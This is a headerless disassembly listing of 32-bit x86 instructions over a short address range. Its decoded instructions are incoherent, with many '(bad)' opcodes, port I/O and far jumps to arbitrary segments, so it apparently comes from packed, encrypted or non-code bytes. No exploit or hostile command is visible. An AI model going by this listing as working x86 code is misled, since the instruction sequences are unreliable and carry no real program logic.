  4175f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175f4:	ret    
  4175f5:	xchg   ebx,eax
  4175f6:	cmp    DWORD PTR [ebp+0x5cf2aef6],0x3fb96459
  417600:	not    BYTE PTR [ecx-0x6d0c0dde]
  417606:	jo     0x41762c
  417608:	(bad)  
  417609:	in     eax,0x7d
  41760b:	sbb    DWORD PTR [edi+eiz*4+0x6d],ebp
  41760f:	dec    ebp
  417610:	pop    esi
  417611:	xchg   ebx,eax
  417612:	push   edi
  417613:	mov    al,0xe1
  417615:	ins    DWORD PTR es:[edi],dx
  417616:	imul   ecx,DWORD PTR [ebp-0x55],0xffffff8c
  41761a:	hlt    
  41761b:	(bad)  
  41761c:	mov    edx,DWORD PTR [edx]
  41761e:	adc    al,0xcf
  417620:	mov    esp,0x61b8c5b4
  417625:	outs   dx,DWORD PTR ds:[esi]
  417626:	jmp    0xca55:0xfbd08ea4
  41762d:	das    
  41762e:	sbb    cl,0x21
  417631:	jns    0x417619
  417633:	pushf  
  417634:	iret   
  417635:	xor    BYTE PTR [ecx-0x1e86a242],cl
  41763b:	je     0x417656
  41763d:	adc    cl,cl
  41763f:	fist   DWORD PTR [esp+edi*8]
  417642:	mov    ah,0x2c
  417644:	add    BYTE PTR [eax],dl
  417646:	inc    esi
  417647:	lahf   
  417648:	(bad)  
  417649:	mov    ds:0x102fe6a8,al
  41764e:	retf   
  41764f:	pop    edx
  417650:	lods   eax,DWORD PTR ds:[esi]
  417651:	aaa    
  417652:	das    
  417653:	scas   al,BYTE PTR es:[edi]
  417654:	icebp  
  417655:	pusha  
  417656:	std    
  417657:	fucomi st,st(0)
  417659:	enter  0x602c,0x2d
  41765d:	ja     0x4175ed
  41765f:	mov    edx,0x8fa6db8
  417664:	push   esp
  417665:	and    DWORD PTR [edi],esi
  417667:	push   ebx
  417668:	sbb    al,0x1a
  41766a:	add    eax,0x2a395e7a
  41766f:	inc    esp
  417670:	repz jae 0x41764d
  417673:	inc    eax
  417674:	mov    BYTE PTR [esi],al
  417676:	nop
  417677:	mov    ecx,0xe5d970f2
  41767c:	imul   ecx,DWORD PTR [edi+0x4d],0xffffffe6
  417680:	clc    
  417681:	xchg   edi,eax
  417682:	fs std 
  417684:	mov    DWORD PTR [eax],eax
  417686:	ss icebp 
  417688:	hlt    
  417689:	xchg   edi,eax
  41768a:	xor    BYTE PTR [esi+0x790856ed],dh
  417690:	into   
  417691:	push   esp
  417692:	enter  0x5acd,0x7b
  417696:	repnz mov edi,esp
  417699:	lds    edx,FWORD PTR [ecx+eiz*4-0x35]
  41769d:	pop    ebx
  41769e:	add    edi,DWORD PTR [ecx+0x6f]
  4176a1:	ror    DWORD PTR [eax-0x6b],cl
  4176a4:	cld    
  4176a5:	xchg   ebp,eax
  4176a6:	add    ecx,esp
  4176a8:	lods   al,BYTE PTR ds:[esi]
  4176a9:	xchg   edi,eax
  4176aa:	ja     0x41769c
  4176ac:	and    DWORD PTR [esi-0x49],edx
  4176af:	inc    esi
  4176b0:	daa    
  4176b1:	mov    al,ds:0x9a44fee8
  4176b6:	sbb    eax,0x346b3bfd
  4176bb:	jb     0x4176a4
  4176bd:	jmp    0x43e1532a
  4176c2:	jle    0x41772d
  4176c4:	pushf  
  4176c5:	lods   eax,DWORD PTR ds:[esi]
  4176c6:	sub    edx,ecx
  4176c8:	sahf   
  4176c9:	inc    ecx
  4176ca:	sub    edi,esp
  4176cc:	jge    0x41768d
  4176ce:	retf   
  4176cf:	retf   0x3d4e
  4176d2:	nop
  4176d3:	stc    
  4176d4:	jl     0x417705
  4176d6:	aad    0xee
  4176d8:	sub    al,BYTE PTR [edi-0x5d]
  4176db:	ret    0x3fea
  4176de:	leave  
  4176df:	data16 and al,0xb7
  4176e2:	repz idiv BYTE PTR [edx]
  4176e5:	dec    edx
  4176e6:	fiadd  DWORD PTR [ebp-0x4f]
  4176e9:	xchg   ecx,eax
  4176ea:	mov    ch,0xb8
  4176ec:	not    DWORD PTR [esi-0x7e]
  4176ef:	dec    esp
  4176f0:	jecxz  0x4176e8
  4176f2:	xor    ebp,DWORD PTR [eax-0x56]
  4176f5:	adc    eax,0x8338a5f8
  4176fa:	jne    0x4176f1
  4176fc:	push   edi
  4176fd:	pop    ebp
  4176fe:	add    ch,BYTE PTR [edi]
  417700:	inc    eax
  417701:	inc    edx
  417702:	mov    edx,0xcddf64b3
  417707:	daa    
  417708:	xchg   al,dh
  41770a:	xchg   esp,eax
  41770b:	mov    WORD PTR [edx-0x72],es
  41770e:	ret    
  41770f:	cli    
  417710:	and    edi,DWORD PTR [ebx]
  417712:	addr16 in eax,dx
  417714:	loopne 0x41771d
  417716:	push   edi
  417717:	hlt    
  417718:	repnz mov ah,0x2f
  41771b:	cld    
  41771c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41771d:	(bad)  
  41771e:	pop    ecx
  41771f:	inc    esp
  417720:	mov    edx,0x72182239
  417725:	xchg   ebx,eax
  417726:	xchg   esp,eax
  417727:	out    dx,eax
  417728:	inc    edi
  417729:	xchg   BYTE PTR [ebp+0x3f],ah
  41772c:	push   DWORD PTR [edx-0x35]
  41772f:	adc    dh,BYTE PTR [ebx-0x2]
  417732:	mov    ah,0xe0
  417734:	retf   
  417735:	pop    es
  417736:	sub    esi,DWORD PTR [esi]
  417738:	loope  0x417721
  41773a:	pop    esp
  41773b:	xor    ebx,ebx
  41773d:	sbb    al,0x7c
  41773f:	(bad)  
  417740:	test   DWORD PTR [ecx+edi*4],0xe4e41400
  417747:	stc    
  417748:	cmp    esi,ecx
  41774a:	out    dx,eax
  41774b:	inc    eax
  41774c:	test   eax,ebx
  41774e:	push   esi
  41774f:	scas   eax,DWORD PTR es:[edi]
  417750:	popf   
  417751:	sub    eax,0x87512e8a
  417756:	and    DWORD PTR [edx],ebp
  417758:	in     eax,dx
  417759:	out    dx,eax
  41775a:	es stos DWORD PTR es:[edi],eax
  41775c:	mov    dl,0xc1
  41775e:	cli    
  41775f:	push   ebp
  417760:	repz pop eax
  417762:	dec    esi
  417763:	mov    bl,0x24
  417765:	jmp    0x4177a1
  417767:	std    
  417768:	arpl   WORD PTR [eax+0x36513834],sp
  41776e:	add    edi,DWORD PTR [edx-0x1a26b727]
  417774:	xchg   ebx,eax
  417775:	or     al,BYTE PTR [esi+0x28]
  417778:	gs (bad) 
  41777a:	dec    ecx
  41777b:	cmc    
  41777c:	jl     0x41771b
  41777e:	pop    edx
  41777f:	daa    
  417780:	shl    ebp,cl
  417782:	stos   BYTE PTR es:[edi],al
  417783:	sbb    DWORD PTR [ebx],ebp
  417785:	aaa    
  417786:	dec    edi
  417787:	in     eax,0x85
  417789:	mov    gs,WORD PTR [esi+0x5]
  41778c:	and    BYTE PTR [eax],bh
  41778e:	mov    bh,BYTE PTR [edi+0x18]
  417791:	lds    esi,FWORD PTR [esi+0x23]
  417794:	stos   BYTE PTR es:[edi],al
  417795:	jmp    0x47db:0xf9ec01ec
  41779c:	sub    eax,0x11a22bd2
  4177a1:	push   es
  4177a2:	sub    ch,cl
  4177a4:	jae    0x4177b6
  4177a6:	mov    ebx,0x51a093e0
  4177ab:	fstp   QWORD PTR [ebp+0x58760a11]
  4177b1:	(bad)  
  4177b3:	sbb    DWORD PTR [edx+ebp*2+0x61],ebp
  4177b7:	and    eax,0xa17c4ce
  4177bc:	imul   ebp,DWORD PTR [esi+0x24de09f8],0xf817fd1d
  4177c6:	out    dx,eax
  4177c7:	icebp  
  4177c8:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177ca:	push   esi
  4177cb:	fst    QWORD PTR [edx+0x59]
  4177ce:	fidivr DWORD PTR [ebx+edi*2+0x3afa318d]
  4177d5:	and    esi,DWORD PTR ds:0x9284c896
  4177db:	jb     0x4177dc
  4177dd:	adc    DWORD PTR ds:0x2af09fce,edi
  4177e3:	js     0x417805
  4177e5:	dec    eax
  4177e6:	(bad)  
  4177e7:	sti    
  4177e8:	mov    al,ds:0x47761c86
  4177ed:	(bad)  
  4177ef:	ins    DWORD PTR es:[edi],dx
  4177f0:	clc    
  4177f1:	ins    BYTE PTR es:[edi],dx
  4177f2:	xor    DWORD PTR [edi-0x567103d0],edi
  4177f8:	cmp    DWORD PTR [ebx],ebp
  4177fa:	push   ds
  4177fb:	dec    cx
  4177fd:	es mov ch,0x5e
  417800:	add    eax,DWORD PTR ds:0x5d334f2b
  417806:	test   DWORD PTR [edx+ebp*1+0x7],eax
  41780a:	and    BYTE PTR [ecx],bl
  41780c:	jle    0x4177b4
  41780e:	add    eax,DWORD PTR [esi+0x71]
  417811:	in     eax,0x2e
  417813:	push   eax
  417814:	mov    eax,eax
  417816:	mov    ch,0xfa
  417818:	js     0x4177e0
  41781a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41781b:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41781d:	(bad)  
  41781f:	jmp    0x7c0b4414
  417824:	inc    ebp
  417825:	xchg   esp,eax
  417826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417827:	test   eax,0x2e870b82
  41782c:	xor    ah,dl
  41782e:	push   eax
  41782f:	jno    0x417869
  417831:	mov    bh,0x73
  417833:	cmp    BYTE PTR ds:0x5a1741da,ah
  417839:	mov    dl,0x42
  41783b:	int    0x57
  41783d:	pop    ds
  41783e:	dec    eax
  41783f:	outs   dx,DWORD PTR ds:[esi]
  417840:	out    dx,al
  417841:	(bad)  
  417844:	cmp    esp,DWORD PTR [ecx+0x2c]
  417847:	cmp    BYTE PTR [ecx],0xee
  41784a:	les    eax,FWORD PTR [eax]
  41784c:	es push esp
  41784e:	aad    0x37
  417850:	shr    BYTE PTR [ebx+eiz*8],0x6f
  417854:	retf   
  417855:	ret    
  417856:	push   esi
  417857:	xor    DWORD PTR [ecx+0x90fd1c4],esi
  41785d:	mov    eax,0xc78567f0
  417862:	fiadd  DWORD PTR [esi]
  417864:	vpaddusb ymm2,ymm5,YMMWORD PTR [edi+0x74738d8d]
  41786c:	mov    ch,0xaf
  41786e:	mov    ebx,0x7cb109f0
  417873:	xor    eax,0x3444f993
  417878:	cld    
  417879:	jp     0x4178a1
  41787b:	jae    0x41787d
  41787d:	mov    dh,0x2e
  41787f:	or     eax,0x2193ffa0
  417884:	sbb    BYTE PTR [esp+ebx*1-0x59],ah
  417888:	mov    DWORD PTR [ebp-0x42],ebp
  41788b:	pop    es
  41788c:	jbe    0x4178ed
  41788e:	xchg   BYTE PTR [esi],ch
  417890:	jo     0x417896
  417892:	mov    al,0x71
  417894:	enter  0x3d73,0xc
  417898:	test   al,0x51
  41789a:	retf   0x1f89
  41789d:	fs ja  0x417910
  4178a0:	pop    ds
  4178a1:	lahf   
  4178a2:	dec    edi
  4178a3:	fistp  DWORD PTR [edi-0x80]
  4178a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178a7:	in     al,dx
  4178a8:	ror    bh,1
  4178aa:	sub    edx,DWORD PTR [esi+0x5308815a]
  4178b0:	or     DWORD PTR [ebx+0xb],edi
  4178b3:	jnp    0x41783d
  4178b5:	inc    esp
  4178b6:	jae    0x4178af
  4178b8:	sar    BYTE PTR [edx-0x34df0c0d],cl
  4178be:	xchg   edx,eax
  4178bf:	add    DWORD PTR ds:0x166ce756,0x65
  4178c6:	into   
  4178c7:	mov    esp,0xf792406e
  4178cc:	dec    ecx
  4178cd:	aad    0x50
  4178cf:	test   al,0x7
  4178d1:	pop    edi
  4178d2:	lods   al,BYTE PTR ds:[esi]
  4178d3:	add    bl,BYTE PTR gs:[esi+eax*8+0x45]
  4178d8:	std    
  4178d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178da:	mov    al,0x5d
  4178dc:	dec    BYTE PTR [ebp+ebp*1-0x79b908dc]
  4178e3:	adc    eax,0xbeba21e5
  4178e8:	inc    eax
  4178e9:	mov    edx,DWORD PTR [edx-0x28]
  4178ec:	test   DWORD PTR [esi+eax*8],eax
  4178ef:	adc    si,dx
  4178f2:	mov    bh,0x46
  4178f4:	and    BYTE PTR [ebp-0x405eb063],0xc0
  4178fb:	ds pop esp
  4178fd:	ss sbb ebp,ebp
  417900:	adc    BYTE PTR [ecx],0x2d
  417903:	cdq    
  417904:	data16 adc al,0x4b
  417907:	cmp    eax,0x70031d1b
  41790c:	(bad)  
  41790d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41790e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41790f:	stos   DWORD PTR es:[edi],eax
  417910:	aad    0xbe
  417912:	in     al,0x84
  417914:	mov    bl,0xb7
  417916:	test   al,0xb6
  417918:	mov    al,0xd2
  41791a:	fidiv  DWORD PTR [eax+0x36]
  41791d:	sti    
  41791e:	mov    bh,0x4
  417920:	sbb    BYTE PTR [edx],0x72
  417923:	mov    ebp,0x1fe67b31
  417928:	push   ebp
  417929:	add    BYTE PTR [edx-0x12],bh
  41792c:	jae    0x417906
  41792e:	loopne 0x4178ef
  417930:	test   BYTE PTR [esi+0x46],cl
  417933:	inc    eax
  417934:	fild   DWORD PTR ds:0xd7046a46
  41793a:	fld    DWORD PTR [ebx-0x76]
  41793d:	sub    ch,BYTE PTR [edx]
  41793f:	sbb    BYTE PTR [edx],0x48
  417942:	scas   al,BYTE PTR es:[edi]
  417943:	(bad)  
  417944:	sbb    al,BYTE PTR [edi]
  417946:	loop   0x41797b
  417948:	jbe    0x417956
  41794a:	mov    ds:0x78c93154,al
  41794f:	lods   al,BYTE PTR ds:[esi]
  417950:	mov    DWORD PTR [edi+0x3dc39974],ebx
  417956:	sbb    eax,0xa1cdf2bd
  41795b:	mov    ch,0x35
  41795d:	stos   BYTE PTR es:[edi],al
  41795e:	leave  
  41795f:	inc    esp
  417960:	into   
  417961:	mov    dl,0xdc
  417963:	and    al,dl
  417965:	cmp    eax,DWORD PTR [edx+0x74df8587]
  41796b:	arpl   WORD PTR [eax+0x45],bp
  41796e:	mov    ds:0xfb0092fb,al
  417973:	sbb    ecx,eax
  417975:	add    ah,bl
  417977:	test   DWORD PTR [ebx-0x7c8137d5],esi
  41797d:	rol    DWORD PTR [ecx+0x3a],0xa
  417981:	xchg   edx,eax
  417982:	jmp    0x1830:0x280ad4ca
  417989:	cdq    
  41798a:	jle    0x4179c8
  41798c:	retf   
  41798d:	daa    
  41798e:	pop    ebp
  41798f:	add    DWORD PTR [esi],0x9fe10b32
  417995:	lds    ebp,FWORD PTR [edx-0x74]
  417998:	mov    cl,0x8d
  41799a:	fimul  WORD PTR [ebx]
  41799c:	and    eax,0xb68d3d90
  4179a1:	fs sbb DWORD PTR cs:[esp+edx*2-0x3d],esp
  4179a7:	loope  0x4179f5
  4179a9:	xchg   esp,eax
  4179aa:	dec    ecx
  4179ab:	push   edx
  4179ac:	sbb    al,BYTE PTR [ecx]
  4179ae:	pop    es
  4179af:	jo     0x4179dc
  4179b1:	shr    WORD PTR [esi+0x2be8b049],cl
  4179b8:	(bad)  
  4179b9:	test   BYTE PTR [ecx],al
  4179bb:	pop    esi
  4179bc:	aaa    
  4179bd:	add    DWORD PTR ds:0xbe24f0f4,edi
  4179c3:	sbb    DWORD PTR [ecx],0xffffffc1
  4179c6:	mov    esi,0x59d4884f
  4179cb:	sub    ch,BYTE PTR [ecx+0x12]
  4179ce:	repz mov dl,0x8e
  4179d1:	push   0x630f1b19
  4179d6:	and    bl,dh
  4179d8:	aam    0x3
  4179da:	loope  0x41799f
  4179dc:	retf   
  4179dd:	ffree  st(5)
  4179df:	jae    0x417a04
  4179e1:	push   esi
  4179e2:	push   0xffffff85
  4179e4:	fadd   DWORD PTR [esi-0x60452b6c]
  4179ea:	xchg   edi,eax
  4179eb:	jg     0x417a53
  4179ed:	popf   
  4179ee:	in     eax,dx
  4179ef:	aas    
  4179f0:	mov    cl,0xd8
  4179f2:	aaa    
  4179f3:	pusha  
  4179f4:	sbb    esi,ecx
  4179f6:	or     dh,BYTE PTR [esi]
  4179f8:	fwait
  4179f9:	icebp  
  4179fa:	push   ebp
  4179fb:	fwait
  4179fc:	std    
  4179fd:	push   ebp
  4179fe:	inc    esp
  4179ff:	mov    esp,0x5ff83012
  417a04:	scas   eax,DWORD PTR es:[edi]
  417a05:	call   0xf1d7:0x32843ea6
  417a0c:	in     eax,0x82
  417a0e:	or     esp,ebp
  417a10:	sti    
  417a11:	not    BYTE PTR ds:[ebp+0x6b406b36]
  417a18:	sbb    al,ah
  417a1a:	mov    eax,ds:0xf8b72cd6
  417a1f:	cwde   
  417a20:	adc    eax,0xa2dcff63
  417a25:	jecxz  0x417a10
  417a27:	sub    dh,dh
  417a29:	sbb    al,BYTE PTR [ebp-0x18c82431]
  417a2f:	shl    dh,0xdc
  417a32:	and    al,0xd1
  417a34:	test   al,0x8e
  417a36:	xor    al,0x4e
  417a38:	push   0xffffff95
  417a3a:	push   0xffffff86
  417a3c:	dec    ebx
  417a3d:	fs push edx
  417a3f:	popf   
  417a40:	in     eax,dx
  417a41:	rol    BYTE PTR [ecx+edx*2],cl
  417a44:	(bad)  
  417a45:	in     eax,dx
  417a46:	repnz int3 
  417a48:	push   ds
  417a49:	adc    eax,0x44667b21
  417a4e:	mov    dh,0x8d
  417a50:	mov    al,ds:0xeea52b01
  417a55:	or     eax,0xd2933cfc
  417a5a:	out    0xcb,eax
  417a5c:	pusha  
  417a5d:	and    edx,0xffffffb8
  417a60:	mov    edi,0x7cdaf189
  417a65:	sbb    ch,BYTE PTR [ebp+0x24]
  417a68:	add    al,0x9c
  417a6a:	xchg   edi,eax
  417a6b:	xor    BYTE PTR [ecx-0x34daec1d],cl
  417a71:	cmp    eax,0xf9c8b4ab
  417a76:	out    0xdd,al
  417a78:	adc    bh,BYTE PTR [ebp-0x4782f8b6]
  417a7e:	icebp  
  417a7f:	add    eax,0x49f5ba25
  417a84:	mov    bh,0x32
  417a86:	sbb    BYTE PTR [ecx],ah
  417a88:	mov    al,0x7f
  417a8a:	add    al,0x2b
  417a8c:	push   0xffffffe4
  417a8e:	in     al,0x67
  417a90:	lods   eax,DWORD PTR ds:[esi]
  417a91:	lods   eax,DWORD PTR ds:[esi]
  417a92:	mov    dh,0x93
  417a94:	pushf  
  417a95:	(bad)  
  417a96:	dec    esp
  417a97:	mov    ebp,0xc92b2b32
  417a9c:	and    BYTE PTR [esi-0x6d483a41],dh
  417aa2:	dec    edi
  417aa3:	add    BYTE PTR ds:0xa56c9037,ah
  417aa9:	xor    al,0x8
  417aab:	jae    0x417a31
  417aad:	sub    BYTE PTR [ecx],cl
  417aaf:	pop    ecx
  417ab0:	cmp    al,0x2c
  417ab2:	out    dx,al
  417ab3:	xchg   ebp,eax
  417ab4:	sub    eax,DWORD PTR [ecx+0xf61e8e2]
  417aba:	repz addr16 jmp 0x5e59:0xb2711a7f
  417ac3:	dec    ecx
  417ac4:	fwait
  417ac5:	xchg   esi,eax
  417ac6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ac7:	jp     0x417af1
  417ac9:	inc    edi
  417aca:	sub    DWORD PTR [esi],ecx
  417acc:	imul   ebp,DWORD PTR gs:[eax],0x3ca54258
  417ad3:	lock and al,0x2a
  417ad6:	xchg   DWORD PTR [edx-0x74],eax
  417ad9:	loop   0x417ace
  417adb:	call   FWORD PTR [eax]
  417add:	(bad)  [eax-0x57c26426]
  417ae3:	aad    0x54
  417ae5:	dec    edi
  417ae6:	leave  
  417ae7:	mov    esi,0x9bcb064a
  417aec:	std    
  417aed:	pop    esi
  417aee:	into   
  417aef:	sbb    al,0x72
  417af1:	mov    DWORD PTR [ecx+0x4c],ecx
  417af4:	imul   ecx,DWORD PTR [edi],0xffffffae
  417af7:	adc    BYTE PTR [esi],dl
  417af9:	in     al,dx
  417afa:	jne    0x417b08
  417afc:	xor    DWORD PTR [eax+0x16],eax
  417aff:	or     al,0xc6
  417b01:	add    DWORD PTR [edi],ebp
  417b03:	sbb    DWORD PTR [eax-0x6b02b0fa],ebp
  417b09:	ins    DWORD PTR es:[edi],dx
  417b0a:	pop    ds
  417b0b:	test   al,0xfc
  417b0d:	dec    eax
  417b0e:	jns    0x417a9a
  417b10:	stc    
  417b11:	push   ss
  417b12:	sbb    BYTE PTR [ebx-0xf9f5e31],bl
  417b18:	push   ebp
  417b19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b1a:	add    BYTE PTR [esp+ebp*4+0x39],0x8f
  417b1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b20:	push   ebp
  417b21:	mov    BYTE PTR [ecx+0x62],cl
  417b24:	shl    DWORD PTR [esi+esi*1-0x2de540ca],1
  417b2b:	in     eax,0xcd
  417b2d:	mov    ebx,0xc1fe1b07
  417b32:	fwait
  417b33:	hlt    
  417b34:	pop    es
  417b35:	push   ss
  417b36:	xor    ebp,DWORD PTR [ebx]
  417b38:	mov    dh,0x10
  417b3a:	push   esp
  417b3b:	pop    edx
  417b3c:	add    ch,0x7e
  417b3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b40:	sbb    BYTE PTR ds:0x98232c8c,dl
  417b46:	ja     0x417b5e
  417b48:	push   es
  417b49:	adc    al,0x88
  417b4b:	cli    
  417b4c:	mov    edx,0x3fd216e8
  417b51:	pushf  
  417b52:	popa   
  417b53:	jl     0x417b37
  417b55:	std    
  417b56:	ficomp WORD PTR [ebx-0x2b]
  417b59:	cli    
  417b5a:	scas   eax,DWORD PTR es:[edi]
  417b5b:	sub    edx,DWORD PTR [eax+edx*4]
  417b5e:	in     eax,0x48
  417b60:	sti    
  417b61:	sub    eax,ebp
  417b63:	ror    edi,1
  417b65:	lods   al,BYTE PTR ds:[esi]
  417b66:	xchg   esp,eax
  417b67:	cmp    esi,DWORD PTR [edx+0x0]
  417b6a:	dec    eax
  417b6b:	push   esp
  417b6c:	push   ebp
  417b6d:	jbe    0x417bcb
  417b6f:	bnd jg 0x417bd3
  417b72:	mov    ds:0x8cd78bca,eax
  417b77:	jl     0x417b14
  417b79:	jne    0x417bc5
  417b7b:	sub    al,0x35
  417b7d:	jae    0x417b03
  417b7f:	jb     0x417bcc
  417b81:	outs   dx,BYTE PTR ds:[esi]
  417b82:	mov    ebp,0x3cf670fc
  417b87:	fstp   QWORD PTR [edx-0x4dd16e79]
  417b8d:	cmc    
  417b8e:	xchg   ecx,eax
  417b8f:	test   BYTE PTR [ebx],dl
  417b91:	push   edi
  417b92:	adc    BYTE PTR [eax+0x6d],dh
  417b95:	xchg   ebx,esi
  417b97:	xlat   BYTE PTR ds:[ebx]
  417b98:	jb     0x417c13
  417b9a:	push   edi
  417b9b:	cmc    
  417b9c:	mov    esp,ebp
  417b9e:	aaa    
  417b9f:	mov    WORD PTR ds:0xc967f00b,cs
  417ba5:	xchg   edx,eax
  417ba6:	jmp    0x7e0ed487
  417bab:	cld    
  417bac:	stos   DWORD PTR es:[edi],eax
  417bad:	sti    
  417bae:	shl    ah,0xff
  417bb1:	jnp    0x417b6e
  417bb3:	dec    ecx
  417bb4:	(bad)  
  417bb6:	add    BYTE PTR [ecx-0x55],dl
  417bb9:	ja     0x417c06
  417bbb:	xor    DWORD PTR [ebx],ecx
  417bbd:	push   cs
  417bbe:	in     al,0x46
  417bc0:	sub    eax,0x382a9f21
  417bc5:	pusha  
  417bc6:	sbb    al,0xf6
  417bc8:	xchg   edx,edi
  417bca:	imul   ebp,DWORD PTR [edi+0x30f3d877],0x36b14403
  417bd4:	lea    esp,[esi]
  417bd6:	test   BYTE PTR [ecx],al
  417bd8:	push   cs
  417bd9:	cwde   
  417bda:	js     0x417c03
  417bdc:	or     bh,al
  417bde:	pushf  
  417bdf:	cmc    
  417be0:	mov    dh,0x16
  417be2:	lods   al,BYTE PTR ds:[esi]
  417be3:	(bad)  
  417be5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417be6:	mov    dh,0x7b
  417be8:	xchg   esi,eax
  417be9:	ja     0x417bc5
  417beb:	xor    eax,0x1c93a9e3
  417bf0:	leave  
  417bf1:	mov    ds:0x1826ae0f,al
  417bf6:	push   es
  417bf7:	push   eax
  417bf8:	pop    eax
  417bf9:	outs   dx,BYTE PTR ds:[esi]
  417bfa:	jns    0x417c49
  417bfc:	iret   
  417bfd:	imul   ebp,ebp,0x3870f345
  417c03:	push   ss
  417c04:	pusha  
  417c05:	pop    ebx
  417c06:	in     al,dx
  417c07:	loop   0x417c6b
  417c09:	in     eax,dx
  417c0a:	jbe    0x417c74
  417c0c:	adc    dh,BYTE PTR [ebp-0x49]
  417c0f:	fiadd  WORD PTR [ebp+0x5619cb2d]
  417c15:	pop    edi
  417c16:	call   0xd0ad:0x1837ae36
  417c1d:	repnz lods eax,DWORD PTR ds:[esi]
  417c1f:	add    ch,BYTE PTR [esi+0x6faec7a]
  417c25:	cmc    
  417c26:	sub    DWORD PTR ds:0xe56ad07,ebx
  417c2c:	or     edx,esp
  417c2e:	dec    edi
  417c2f:	sets   ah
  417c32:	lods   eax,DWORD PTR ds:[esi]
  417c33:	(bad)
  417c36:	cmp    eax,0xdbdeef86
  417c3b:	add    BYTE PTR [ecx-0x5624cbe5],bh
  417c41:	xchg   esi,eax
  417c42:	xchg   edx,eax
  417c43:	jecxz  0x417bce
  417c45:	mov    fs,WORD PTR [ecx+0x1f1ef598]
  417c4b:	test   eax,0x794836da
  417c50:	(bad)  [eax]
  417c52:	jne    0x417c5e
  417c54:	rol    DWORD PTR [edx+ecx*8],cl
  417c57:	sub    DWORD PTR [ebp+0x72],edx
  417c5a:	xchg   edi,eax
  417c5b:	inc    edi
  417c5c:	ins    DWORD PTR es:[edi],dx
  417c5d:	and    edi,DWORD PTR [edx]
  417c5f:	add    DWORD PTR [ecx],ebp
  417c61:	hlt    
  417c62:	nop
  417c63:	repz sti 
  417c65:	cmp    DWORD PTR ds:0x1b477dcb,ebp
  417c6b:	xor    BYTE PTR [edi],dh
  417c6d:	push   ebx
  417c6e:	sbb    dl,BYTE PTR [ebx-0x3ccf448]
  417c74:	fisub  DWORD PTR [ecx-0x71ef73e6]
  417c7a:	adc    ah,BYTE PTR [ecx+0x2f]
  417c7d:	ret    
  417c7e:	dec    esi
  417c7f:	out    dx,eax
  417c80:	add    ah,BYTE PTR [ebp-0x2274ce91]
  417c86:	sub    edi,esi
  417c88:	cwde   
  417c89:	mov    esp,0x9c4c8737
  417c8e:	js     0x417ced
  417c90:	inc    esi
  417c91:	imul   esi,DWORD PTR [edi-0x7d9fce58],0x32
  417c98:	int    0x7d
  417c9a:	mov    eax,ds:0xc49183f3
  417c9f:	jae    0x417c44
  417ca1:	cmp    DWORD PTR [esp+eiz*4+0x4715282d],0xffffffde
  417ca9:	in     eax,dx
  417caa:	stc    
  417cab:	enter  0x97b2,0x3a
  417caf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cb0:	ins    BYTE PTR es:[edi],dx
  417cb1:	pop    esp
  417cb2:	ret    0xc81e
  417cb5:	push   ds
  417cb6:	out    dx,al
  417cb7:	jbe    0x417cb0
  417cb9:	inc    edx
  417cba:	mov    ds:0x98b70e5d,eax
  417cbf:	xor    DWORD PTR [edi],esi
  417cc1:	push   ecx
  417cc2:	ds pushf 
  417cc4:	dec    eax
  417cc5:	add    al,0x3f
  417cc7:	call   0x1dab:0x19ad87a4
  417cce:	xchg   ebx,eax
  417ccf:	hlt    
  417cd0:	out    dx,al
  417cd1:	or     DWORD PTR [edi],ebp
  417cd3:	out    0xbc,al
  417cd5:	pop    ds
  417cd6:	jle    0x417d0a
  417cd8:	xor    DWORD PTR [ebx],ebp
  417cda:	pop    ebp
  417cdb:	fild   DWORD PTR [ebx]
  417cdd:	call   FWORD PTR [edi-0x1]
  417ce0:	mov    ds:0x63c52641,al
  417ce5:	inc    BYTE PTR [edi]
  417ce7:	mov    ch,BYTE PTR [ecx-0x12]
  417cea:	retf   
  417ceb:	les    esi,FWORD PTR [esi]
  417ced:	les    ecx,FWORD PTR [edx+0x55]
  417cf0:	or     BYTE PTR [eax-0x41],bh
  417cf3:	mov    DWORD PTR [edx+eiz*4+0x46],eax
  417cf7:	dec    eax
  417cf8:	inc    edx
  417cf9:	mov    cl,BYTE PTR [edi]
  417cfb:	sbb    edi,esi
  417cfd:	clc    
  417cfe:	dec    ebp
  417cff:	and    eax,0x90730966
  417d04:	sub    al,0x39
  417d06:	jne    0x417d22
  417d08:	bnd jnp 0x417caa
  417d0b:	(bad)  
  417d0d:	arpl   si,ax
  417d0f:	adc    DWORD PTR [eax*4-0x16a89b83],ebp
  417d16:	mov    DWORD PTR [ebx-0x41],edx
  417d19:	xchg   BYTE PTR [edi+0x4c18ae40],bl
  417d1f:	jbe    0x417ce7
  417d21:	pop    eax
  417d22:	jmp    0x417d9b
  417d24:	popf   
  417d25:	mov    ecx,0xd8760153
  417d2a:	data16 xchg BYTE PTR [eax],cl
  417d2d:	stos   DWORD PTR es:[edi],eax
  417d2e:	xchg   DWORD PTR [edx],ebp
  417d30:	inc    ebx
  417d31:	retf   
  417d32:	cs push es
  417d34:	paddw  mm2,QWORD PTR [ebp+0x57a50836]
  417d3b:	out    dx,al
  417d3c:	addr16 cwde 
  417d3e:	push   esi
  417d3f:	rcl    DWORD PTR [ecx+0x77],0xfe
  417d43:	popa   
  417d44:	sbb    eax,0xca528c2
  417d49:	push   edi
  417d4a:	mov    ds:0xedbfa313,eax
  417d4f:	inc    esi
  417d50:	bnd jge 0x417d0d
  417d53:	jmp    0x7b22:0x8ee0ef8e
  417d5a:	cmp    DWORD PTR [esi+0x5f],esp
  417d5d:	addr16 or dl,0x6
  417d61:	jp     0x417ddd
  417d63:	mov    ebp,0xdb129963
